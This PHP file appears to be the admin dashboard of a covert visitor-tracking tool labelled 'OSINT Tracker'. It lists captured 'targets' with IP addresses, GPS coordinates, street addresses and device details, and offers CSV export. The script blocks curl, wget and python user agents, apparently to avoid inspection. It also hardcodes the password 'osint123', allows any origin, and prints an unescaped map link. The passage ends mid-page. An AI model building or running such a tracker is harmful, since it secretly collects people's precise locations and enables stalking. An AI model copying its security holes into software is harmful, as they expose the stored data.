<?php
// Aktifkan error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set zona waktu ke Waktu Indonesia Barat (WIB)
date_default_timezone_set('Asia/Jakarta');

// CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

session_start();

// Proteksi view-source dan debugging
if (isset($_SERVER['HTTP_USER_AGENT']) && (
    strpos($_SERVER['HTTP_USER_AGENT'], 'curl') !== false ||
    strpos($_SERVER['HTTP_USER_AGENT'], 'wget') !== false ||
    strpos($_SERVER['HTTP_USER_AGENT'], 'python') !== false
)) {
    http_response_code(403);
    die('Access Denied');
}

// Cek apakah akses dari view-source atau debug
if (isset($_GET['debug']) || isset($_POST['debug'])) {
    http_response_code(403);
    die();
}

// Header keamanan tambahan
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Konfigurasi
define('ACCESS_PASSWORD', 'osint123');

// Fungsi konversi ke WIB
function formatWIB($timestamp) {
    if (empty($timestamp)) return '-';
    try {
        $date = new DateTime($timestamp);
        $date->setTimezone(new DateTimeZone('Asia/Jakarta'));
        return $date->format('H:i:s') . ' <span class="text-[10px] font-sans font-bold text-slate-500 ml-1 tracking-wider">WIB</span>';
    } catch (Exception $e) {
        return $timestamp;
    }
}

function formatWIBFull($timestamp) {
    if (empty($timestamp)) return '-';
    try {
        $date = new DateTime($timestamp);
        $date->setTimezone(new DateTimeZone('Asia/Jakarta'));
        return $date->format('Y-m-d H:i:s');
    } catch (Exception $e) {
        return $timestamp;
    }
}

// Fungsi logging
function writeLog($message, $data = null) {
    $logFile = __DIR__ . '/osint_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp WIB] $message";
    if ($data) {
        $logMessage .= " - " . json_encode($data, JSON_PRETTY_PRINT);
    }
    file_put_contents($logFile, $logMessage . PHP_EOL, FILE_APPEND);
}

writeLog("nausr.php accessed from " . $_SERVER['REMOTE_ADDR']);

// Cek autentikasi
$authenticated = false;
$error = '';

if (isset($_SESSION['tracking_auth']) && $_SESSION['tracking_auth'] === true) {
    $authenticated = true;
}

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === ACCESS_PASSWORD) {
        $_SESSION['tracking_auth'] = true;
        $authenticated = true;
        writeLog("Login successful from " . $_SERVER['REMOTE_ADDR']);
    } else {
        $error = 'Password salah!';
        writeLog("Login failed from " . $_SERVER['REMOTE_ADDR']);
    }
}

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['tracking_auth']);
    session_destroy();
    header('Location: nausr.php');
    exit;
}

// API endpoint untuk data
if (isset($_GET['api']) && $_GET['api'] === 'get_data' && $authenticated) {
    header('Content-Type: application/json');
    
    // Ambil dari session dulu
    $visitorData = $_SESSION['visitor_data'] ?? [];
    
    // Jika session kosong, coba ambil dari backup file
    if (empty($visitorData)) {
        $backupFile = __DIR__ . '/osint_backup.json';
        if (file_exists($backupFile)) {
            $backupContent = file_get_contents($backupFile);
            $visitorData = json_decode($backupContent, true) ?: [];
            writeLog("Loaded data from backup file", count($visitorData));
        }
    }
    
    // Format semua timestamp ke WIB untuk response
    foreach ($visitorData as &$visitor) {
        if (isset($visitor['timestamp'])) {
            $visitor['timestamp_wib'] = formatWIBFull($visitor['timestamp']);
            $visitor['timestamp_display'] = formatWIB($visitor['timestamp']);
        }
        if (isset($visitor['server_timestamp'])) {
            $visitor['server_timestamp_wib'] = formatWIBFull($visitor['server_timestamp']);
        }
    }
    
    writeLog("API get_data called, data count: " . count($visitorData));
    
    // Hitung statistik
    $totalVisitors = count($visitorData);
    $uniqueIPs = count(array_unique(array_column($visitorData, 'ip_address')));
    
    $gpsCount = 0;
    $totalAccuracy = 0;
    foreach ($visitorData as $data) {
        if (isset($data['source']) && $data['source'] === 'gps') {
            $gpsCount++;
            if (isset($data['accuracy'])) {
                $totalAccuracy += $data['accuracy'];
            }
        }
    }
    $avgAccuracy = $gpsCount > 0 ? round($totalAccuracy / $gpsCount) : 0;
    
    // Negara terbanyak
    $countries = array_count_values(array_column($visitorData, 'country'));
    arsort($countries);
    $topCountry = $countries ? array_key_first($countries) : '-';
    
    // Kota terbanyak
    $cities = array_count_values(array_column($visitorData, 'city'));
    arsort($cities);
    $topCity = $cities ? array_key_first($cities) : '-';
    
    // Filter lokasi valid
    $validLocations = array_filter($visitorData, function($item) {
        return isset($item['latitude']) && isset($item['longitude']) && 
               abs($item['latitude']) > 0.1 && abs($item['longitude']) > 0.1;
    });
    
    echo json_encode([
        'success' => true,
        'data' => [
            'visitors' => $visitorData,
            'valid_locations' => array_values($validLocations),
            'stats' => [
                'total' => $totalVisitors,
                'unique' => $uniqueIPs,
                'gps_count' => $gpsCount,
                'ip_count' => $totalVisitors - $gpsCount,
                'top_country' => $topCountry,
                'top_city' => $topCity,
                'avg_accuracy' => $avgAccuracy,
                'last_update' => !empty($visitorData) ? formatWIBFull($visitorData[0]['timestamp'] ?? '') : '-'
            ]
        ],
        'server_time' => date('Y-m-d H:i:s') . ' WIB',
        'server_time_display' => date('H:i:s') . ' WIB',
        'session_id' => session_id()
    ]);
    exit;
}

// Hapus data
if (isset($_POST['delete']) && $authenticated) {
    $index = intval($_POST['delete']);
    if (isset($_SESSION['visitor_data'][$index])) {
        array_splice($_SESSION['visitor_data'], $index, 1);
        
        // Update backup file
        $backupFile = __DIR__ . '/osint_backup.json';
        file_put_contents($backupFile, json_encode($_SESSION['visitor_data'], JSON_PRETTY_PRINT));
        
        echo json_encode(['success' => true]);
        exit;
    }
}

// Reset data
if (isset($_POST['reset']) && $authenticated) {
    $_SESSION['visitor_data'] = [];
    
    // Hapus juga backup file
    $backupFile = __DIR__ . '/osint_backup.json';
    if (file_exists($backupFile)) {
        unlink($backupFile);
    }
    
    echo json_encode(['success' => true]);
    exit;
}

// Export CSV
if (isset($_GET['export']) && $_GET['export'] === 'csv' && $authenticated) {
    $visitorData = $_SESSION['visitor_data'] ?? [];
    
    if (empty($visitorData)) {
        $backupFile = __DIR__ . '/osint_backup.json';
        if (file_exists($backupFile)) {
            $backupContent = file_get_contents($backupFile);
            $visitorData = json_decode($backupContent, true) ?: [];
        }
    }
    
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="osint_data_' . date('Y-m-d_H-i-s') . '_WIB.csv"');
    
    $output = fopen('php://output', 'w');
    fputcsv($output, ['Waktu (WIB)', 'IP Address', 'Sumber', 'Latitude', 'Longitude', 'Negara', 'Kota', 'Alamat', 'Akurasi (m)', 'Device', 'Browser', 'Timezone']);
    
    foreach ($visitorData as $v) {
        fputcsv($output, [
            formatWIBFull($v['timestamp'] ?? ''),
            $v['ip_address'] ?? '-',
            $v['source'] ?? '-',
            $v['latitude'] ?? '-',
            $v['longitude'] ?? '-',
            $v['country'] ?? '-',
            $v['city'] ?? '-',
            $v['full_address'] ?? '-',
            $v['accuracy'] ?? '-',
            $v['platform'] ?? '-',
            $v['browser_name'] ?? '-',
            $v['timezone'] ?? '-'
        ]);
    }
    
    fclose($output);
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Dashboard Premium</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { 
                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
                        mono: ['"JetBrains Mono"', 'monospace']
                    },
                    colors: {
                        brand: { 400: '#34d399', 500: '#10b981', 600: '#059669' },
                        dark: { 800: '#0f172a', 900: '#06090f' }
                    }
                }
            }
        }
    </script>
    
    <style>
        .glass-panel {
            background: rgba(15, 23, 42, 0.5);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        
        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(52, 211, 153, 0.3); border-radius: 3px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(52, 211, 153, 0.5); }
        
        .time-wib { font-family: 'JetBrains Mono', monospace; color: #34d399; }
        
        .accuracy-badge { display: inline-block; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 600; }
        .accuracy-high { background: rgba(52, 211, 153, 0.2); color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
        .accuracy-medium { background: rgba(251, 191, 36, 0.2); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
        .accuracy-low { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        
        .animate-pulse-slow { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        .stat-card-hover { transition: all 0.3s ease; }
        .stat-card-hover:hover { transform: translateY(-2px); border-color: rgba(52, 211, 153, 0.5); }
        
        /* Pagination Button Styles */
        .page-btn { transition: all 0.2s; }
        .page-btn:hover:not(:disabled) { background: rgba(255,255,255,0.1); border-color: rgba(52,211,153,0.5); }
        .page-btn.active { background: rgba(52,211,153,0.15); color: #34d399; border-color: rgba(52,211,153,0.5); font-weight: bold; }
    </style>
</head>
<body class="bg-dark-900 text-slate-300 font-sans antialiased min-h-screen relative selection:bg-brand-500 selection:text-white pb-12">

    <div class="fixed inset-0 z-[-2] bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:24px_24px]"></div>
    <div class="fixed inset-0 z-[-1] overflow-hidden pointer-events-none">
        <div class="absolute top-[-10%] left-[-10%] w-[50rem] h-[50rem] bg-brand-500/5 rounded-full blur-[100px]"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-[50rem] h-[50rem] bg-blue-500/5 rounded-full blur-[100px]"></div>
    </div>

    <div class="container mx-auto px-4 py-6 max-w-[1600px]">
        <?php if (!$authenticated): ?>
            <div class="min-h-[80vh] flex flex-col justify-center items-center">
                <div class="glass-panel p-10 max-w-md w-full rounded-3xl shadow-2xl text-center relative overflow-hidden border border-white/5">
                    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-brand-400 to-blue-500"></div>
                    <div class="w-16 h-16 bg-brand-500/10 text-brand-400 border border-brand-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                        <i class="ph ph-fingerprint text-3xl"></i>
                    </div>
                    <h2 class="text-2xl font-bold text-white mb-2 tracking-tight">System Authorization</h2>
                    <p class="text-slate-400 text-sm mb-4">Waktu Server: <span class="text-brand-400 font-mono"><?php echo date('H:i:s'); ?> WIB</span></p>
                    
                    <?php if ($error): ?>
                        <div class="bg-red-500/10 border border-red-500/30 text-red-400 p-3 rounded-xl mb-6 text-sm flex items-center justify-center gap-2">
                            <i class="ph ph-warning-circle text-lg"></i> <?php echo $error; ?>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-5">
                        <div class="relative group">
                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none transition-colors group-focus-within:text-brand-400 text-slate-500">
                                <i class="ph ph-lock-key text-lg"></i>
                            </div>
                            <input type="password" name="password" placeholder="Enter root password" required 
                                   class="w-full bg-dark-800/50 border border-white/10 text-white placeholder-slate-500 rounded-xl pl-11 pr-4 py-3.5 focus:outline-none focus:border-brand-500/50 focus:ring-1 focus:ring-brand-500/50 transition-all shadow-inner font-mono text-sm">
                        </div>
                        <button type="submit" class="w-full bg-brand-500 hover:bg-brand-600 text-white font-semibold rounded-xl py-3.5 transition-all shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_25px_rgba(16,185,129,0.5)] flex items-center justify-center gap-2">
                            Initialize Session <i class="ph ph-arrow-right font-bold"></i>
                        </button>
                    </form>
                </div>
            </div>

        <?php else: ?>
            <nav class="glass-panel px-6 py-4 rounded-2xl flex flex-col md:flex-row justify-between items-center mb-6 gap-4 border border-white/5 shadow-lg relative overflow-hidden z-20">
                <div class="absolute top-0 left-0 w-1 h-full bg-brand-500 shadow-[0_0_10px_#10b981]"></div>
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-brand-500/10 border border-brand-500/20 text-brand-400 rounded-xl flex items-center justify-center relative">
                        <i class="ph ph-radar text-xl animate-[spin_4s_linear_infinite]"></i>
                        <span class="absolute -top-1 -right-1 flex h-3 w-3">
                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-400 opacity-75"></span>
                            <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-500 border-2 border-dark-900"></span>
                        </span>
                    </div>
                    <div>
                        <h1 class="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                            OSINT Tracker <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-white/10 text-slate-300 border border-white/5 uppercase">Pro</span>
                        </h1>
                        <div class="text-xs text-slate-400 mt-0.5 font-mono flex items-center gap-2">
                            <span>Session: <span class="text-brand-400"><?php echo substr(session_id(), 0, 8); ?>...</span></span>
                            <span class="w-1 h-1 bg-slate-600 rounded-full"></span>
                            <span><i class="ph ph-clock"></i> <span id="liveTime"><?php echo date('H:i:s'); ?> WIB</span></span>
                        </div>
                    </div>
                </div>
                
                <div class="flex items-center gap-2 bg-dark-800/50 p-1.5 rounded-xl border border-white/5">
                    <button onclick="refreshData()" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-white/10 transition-all text-sm font-medium" title="Force Sync">
                        <i class="ph ph-arrows-clockwise text-brand-400"></i> Sync Data
                    </button>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <a href="?export=csv" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-white/10 transition-all text-sm font-medium">
                        <i class="ph ph-download-simple text-blue-400"></i> Export CSV
                    </a>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <button onclick="resetData()" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-orange-400 hover:text-orange-300 hover:bg-orange-500/10 transition-all text-sm font-medium">
                        <i class="ph ph-trash"></i> Reset All
                    </button>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <a href="?logout=1" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-red-400 hover:text-red-300 hover:bg-red-500/10 transition-all text-sm font-medium">
                        <i class="ph ph-power"></i> Terminate
                    </a>
                </div>
            </nav>
            
            <?php
            // Ambil data untuk initial render PHP
            $visitorData = $_SESSION['visitor_data'] ?? [];
            if (empty($visitorData)) {
                $backupFile = __DIR__ . '/osint_backup.json';
                if (file_exists($backupFile)) {
                    $backupContent = file_get_contents($backupFile);
                    $visitorData = json_decode($backupContent, true) ?: [];
                }
            }
            
            $total = count($visitorData);
            $unique = count(array_unique(array_column($visitorData, 'ip_address')));
            $gps = 0;
            $totalAccuracy = 0;
            foreach ($visitorData as $v) {
                if (isset($v['source']) && $v['source'] === 'gps') {
                    $gps++;
                    if (isset($v['accuracy'])) $totalAccuracy += $v['accuracy'];
                }
            }
            $avgAccuracy = $gps > 0 ? round($totalAccuracy / $gps) : 0;
            
            $countries = array_count_values(array_column($visitorData, 'country'));
            arsort($countries);
            $topCountry = $countries ? array_key_first($countries) : '-';
            $cities = array_count_values(array_column($visitorData, 'city'));
            arsort($cities);
            $topCity = $cities ? array_key_first($cities) : '-';
            ?>
            
            <div class="grid grid-cols-2 lg:grid-cols-6 gap-4 md:gap-6 mb-6">
                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-blue-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-blue-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-blue-500/10 flex items-center justify-center text-blue-400 border border-blue-500/20"><i class="ph ph-target text-xl"></i></div>
                        <span class="flex items-center gap-1 text-[10px] font-mono font-medium text-blue-400 bg-blue-500/10 px-2 py-1 rounded-md border border-blue-500/20"><i class="ph ph-trend-up"></i> LIVE</span>
                    </div>
                    <div>
                        <h3 class="text-3xl font-bold text-white tracking-tight mb-1" id="total"><?php echo $total; ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Total Targets</p>
                    </div>
                </div>

                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-purple-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-purple-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center text-purple-400 border border-purple-500/20"><i class="ph ph-fingerprint text-xl"></i></div>
                    </div>
                    <div>
                        <h3 class="text-3xl font-bold text-white tracking-tight mb-1" id="unique"><?php echo $unique; ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Unique IPs</p>
                    </div>
                </div>

                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-brand-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-brand-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-brand-500/10 flex items-center justify-center text-brand-400 border border-brand-500/20"><i class="ph ph-crosshair text-xl"></i></div>
                        <span class="flex items-center gap-1 text-[10px] font-mono font-medium text-brand-400 bg-brand-500/10 px-2 py-1 rounded-md border border-brand-500/20"><i class="ph ph-gps"></i> <?php echo $avgAccuracy > 0 ? "±{$avgAccuracy}m" : ''; ?></span>
                    </div>
                    <div>
                        <h3 class="text-3xl font-bold text-white tracking-tight mb-1" id="gps"><?php echo $gps; ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">GPS Vectors</p>
                    </div>
                </div>

                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-orange-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-orange-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-orange-500/10 flex items-center justify-center text-orange-400 border border-orange-500/20"><i class="ph ph-globe-hemisphere-west text-xl"></i></div>
                    </div>
                    <div>
                        <h3 class="text-3xl font-bold text-white tracking-tight mb-1" id="ip"><?php echo $total - $gps; ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">IP Vectors</p>
                    </div>
                </div>
                
                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-yellow-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-yellow-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-yellow-500/10 flex items-center justify-center text-yellow-400 border border-yellow-500/20"><i class="ph ph-flag text-xl"></i></div>
                    </div>
                    <div>
                        <h3 class="text-xl font-bold text-white tracking-tight mb-1 truncate" id="topCountry"><?php echo htmlspecialchars($topCountry); ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Top Country</p>
                    </div>
                </div>
                
                <div class="relative overflow-hidden glass-panel p-5 rounded-2xl group border border-white/5 hover:border-pink-500/30 transition-all duration-300 stat-card-hover">
                    <div class="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-pink-500/50 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <div class="flex justify-between items-start mb-4">
                        <div class="w-10 h-10 rounded-xl bg-pink-500/10 flex items-center justify-center text-pink-400 border border-pink-500/20"><i class="ph ph-buildings text-xl"></i></div>
                    </div>
                    <div>
                        <h3 class="text-xl font-bold text-white tracking-tight mb-1 truncate" id="topCity"><?php echo htmlspecialchars($topCity); ?></h3>
                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Top City</p>
                    </div>
                </div>
            </div>
            
            <div class="glass-panel rounded-2xl flex flex-col border border-white/5 shadow-lg w-full mb-6 relative">
                <div class="p-5 border-b border-white/5 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 bg-white/[0.01] rounded-t-2xl">
                    <div class="flex items-center gap-3">
                        <div class="w-8 h-8 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center text-slate-400">
                            <i class="ph ph-terminal-window text-lg"></i>
                        </div>
                        <div>
                            <h3 class="text-base font-semibold text-white">Target Activity Logs</h3>
                            <p class="text-xs text-slate-400 font-mono mt-0.5">Real-time captured data stream</p>
                        </div>
                    </div>
                    <div class="flex items-center gap-3">
                        <span class="text-xs text-slate-500 font-mono">Last update: <span id="lastUpdate" class="text-brand-400"><?php echo !empty($visitorData) ? date('H:i:s', strtotime($visitorData[0]['timestamp'] ?? '')) . ' WIB' : '-'; ?></span></span>
                        <span class="text-xs text-slate-600">|</span>
                        <span class="text-xs text-slate-500 font-mono">Total records: <span id="totalRecords" class="text-brand-400"><?php echo $total; ?></span></span>
                    </div>
                </div>
                
                <div class="w-full overflow-x-auto custom-scrollbar">
                    <table class="w-full text-left text-sm min-w-[1300px]" id="data-table">
                        <thead class="bg-dark-800/80 backdrop-blur-md border-b border-white/10 text-slate-400 text-xs uppercase tracking-wider">
                            <tr>
                                <th class="px-6 py-4 font-semibold w-16">#</th>
                                <th class="px-6 py-4 font-semibold w-44">Timestamp (WIB)</th>
                                <th class="px-6 py-4 font-semibold w-40">Target IP</th>
                                <th class="px-6 py-4 font-semibold w-28">Vector</th>
                                <th class="px-6 py-4 font-semibold w-24">Akurasi</th>
                                <th class="px-6 py-4 font-semibold">Geolocation Data</th>
                                <th class="px-6 py-4 font-semibold w-56">Coordinates</th>
                                <th class="px-6 py-4 font-semibold w-28 text-center">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="table-body" class="divide-y divide-white/5 bg-transparent">
                            <?php if (empty($visitorData)): ?>
                                <tr>
                                    <td colspan="8" class="px-6 py-16 text-center text-slate-500">
                                        <div class="flex flex-col items-center gap-3">
                                            <div class="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center text-slate-600 mb-2"><i class="ph ph-ghost text-3xl"></i></div>
                                            <p class="font-medium text-white">No signals intercepted yet</p>
                                            <p class="text-xs font-mono text-slate-500">Listening on port... awaiting incoming data stream.</p>
                                        </div>
                                    </td>
                                </tr>
                            <?php else: ?>
                                <?php 
                                // Render maksimum 10 data pertama saja pada initial load (PHP)
                                $max_initial_rows = 10;
                                foreach ($visitorData as $i => $v): 
                                    if($i >= $max_initial_rows) break;
                                ?>
                                <tr class="hover:bg-brand-500/[0.03] transition-colors group border-b border-white/5 last:border-0">
                                    <td class="px-6 py-4 text-slate-500 font-mono text-xs"><?php echo str_pad($i + 1, 2, '0', STR_PAD_LEFT); ?></td>
                                    <td class="px-6 py-4 font-mono whitespace-nowrap time-wib">
                                        <?php echo date('H:i:s', strtotime($v['timestamp'] ?? 'now')); ?> <span class="text-[10px] font-sans font-bold text-slate-500 ml-1 tracking-wider">WIB</span>
                                        <div class="text-[10px] text-slate-600"><?php echo date('d/m/Y', strtotime($v['timestamp'] ?? 'now')); ?></div>
                                    </td>
                                    <td class="px-6 py-4 font-mono text-brand-400 font-medium tracking-wide"><?php echo htmlspecialchars($v['ip_address'] ?? '-'); ?></td>
                                    <td class="px-6 py-4">
                                        <?php if(($v['source'] ?? 'ip') === 'gps'): ?>
                                            <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-brand-500/10 text-brand-400 text-[11px] font-bold tracking-wide border border-brand-500/20"><i class="ph ph-crosshair"></i> GPS</span>
                                        <?php else: ?>
                                            <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-blue-500/10 text-blue-400 text-[11px] font-bold tracking-wide border border-blue-500/20"><i class="ph ph-globe"></i> IP</span>
                                        <?php endif; ?>
                                    </td>
                                    <td class="px-6 py-4">
                                        <?php if (isset($v['accuracy']) && $v['accuracy'] > 0): ?>
                                            <?php 
                                            $accClass = 'accuracy-medium';
                                            if ($v['accuracy'] < 20) $accClass = 'accuracy-high';
                                            else if ($v['accuracy'] > 100) $accClass = 'accuracy-low';
                                            ?>
                                            <span class="accuracy-badge <?php echo $accClass; ?>">±<?php echo $v['accuracy']; ?>m</span>
                                        <?php else: ?>
                                            <span class="text-slate-600 text-xs">-</span>
                                        <?php endif; ?>
                                    </td>
                                    <td class="px-6 py-4">
                                        <div class="text-slate-200 font-medium text-sm mb-0.5"><?php echo htmlspecialchars($v['city'] ?? '-'); ?>, <span class="text-slate-400"><?php echo htmlspecialchars($v['country'] ?? '-'); ?></span></div>
                                        <div class="text-xs text-slate-500 truncate max-w-[300px]" title="<?php echo htmlspecialchars($v['full_address'] ?? '-'); ?>"><?php echo htmlspecialchars(substr($v['full_address'] ?? '-', 0, 45)); ?>...</div>
                                     </td>
                                    <td class="px-6 py-4 font-mono text-xs text-slate-400 bg-white/[0.01] border-l border-r border-white/5">
                                        <?php if (isset($v['latitude']) && abs($v['latitude']) > 0.1): ?>
                                            <div><?php echo number_format($v['latitude'], 6); ?></div>
                                            <div class="text-slate-600"><?php echo number_format($v['longitude'], 6); ?></div>
                                        <?php else: ?>-<?php endif; ?>
                                     </td>
                                    <td class="px-6 py-4 text-center">
                                        <div class="flex items-center justify-center gap-2 opacity-50 group-hover:opacity-100 transition-opacity">
                                            <?php if (isset($v['google_maps_link'])): ?>
                                                <a href="<?php echo $v['google_maps_link']; ?>" target="_blank" class="flex items-center justify-center w-8 h-8 bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 hover:text-blue-300 rounded-lg transition-all border border-blue-500/20" title="Open in Maps"><i class="ph ph-map-trifold text-lg"></i></a>
                                            <?php endif; ?>
                                            <button onclick="deleteData(<?php echo $i; ?>)" class="flex items-center justify-center w-8 h-8 bg-red-500/10 text-red-400 hover:bg-red-500/20 hover:text-red-300 rounded-lg transition-all border border-red-500/20" title="Delete Record"><i class="ph ph-trash text-lg"></i></button>
                                        </div>
                                    </td>
                                 </tr>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>

                <div id="pagination-container" class="border-t border-white/5 bg-white/[0.01] rounded-b-2xl">
                    <?php if ($total > 10): ?>
                    <div class="flex items-center justify-between px-6 py-4">
                        <div class="text-sm text-slate-400">Showing <span class="font-medium text-white">1</span> to <span class="font-medium text-white">10</span> of <span class="font-medium text-white"><?php echo $total; ?></span> targets</div>
                        <div class="text-xs text-brand-400 animate-pulse font-mono">Initializing mapping...</div>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
            
            <div class="glass-panel rounded-xl overflow-hidden border border-white/5">
                <div class="bg-dark-800/80 px-4 py-2.5 flex items-center justify-between border-b border-white/5">
                    <div class="flex items-center gap-3">
                        <div class="flex gap-1.5">
                            <div class="w-3 h-3 rounded-full bg-red-500/50 animate-pulse-slow"></div>
                            <div class="w-3 h-3 rounded-full bg-yellow-500/50"></div>
                            <div class="w-3 h-3 rounded-full bg-green-500/50"></div>
                        </div>
                        <span class="text-xs text-slate-500 font-mono tracking-wider">system_diagnostic.log</span>
                    </div>
                    <span class="text-xs text-slate-600 font-mono">WIB <?php echo date('H:i:s'); ?></span>
                </div>
                <div class="p-4 font-mono text-[11px] text-brand-400/80 max-h-[120px] overflow-y-auto custom-scrollbar leading-relaxed" id="debug-log">
                    <div class="mb-1"><span class="text-blue-400">root@osint-core:~#</span> ./status_check.sh</div>
                    <div><span class="text-slate-500">[<?php echo date('H:i:s'); ?> WIB]</span> <span class="text-white">SYS_INFO:</span> Session validated (ID: <?php echo substr(session_id(), 0, 8); ?>...)</div>
                    <div><span class="text-slate-500">[<?php echo date('H:i:s'); ?> WIB]</span> <span class="text-white">MEM_CHECK:</span> <?php echo count($_SESSION['visitor_data'] ?? []); ?> target vectors loaded in active memory</div>
                    <div><span class="text-slate-500">[<?php echo date('H:i:s'); ?> WIB]</span> <span class="text-white">IO_STATUS:</span> Backup cluster volume is <?php echo file_exists(__DIR__ . '/osint_backup.json') ? '<span class="text-brand-400">MOUNTED</span>' : '<span class="text-red-400">OFFLINE</span>'; ?></div>
                    <div><span class="text-slate-500">[<?php echo date('H:i:s'); ?> WIB]</span> <span class="text-white">GPS_ACC:</span> Rata-rata akurasi <span class="text-brand-400"><?php echo $avgAccuracy > 0 ? "±{$avgAccuracy}m" : 'N/A'; ?></span></div>
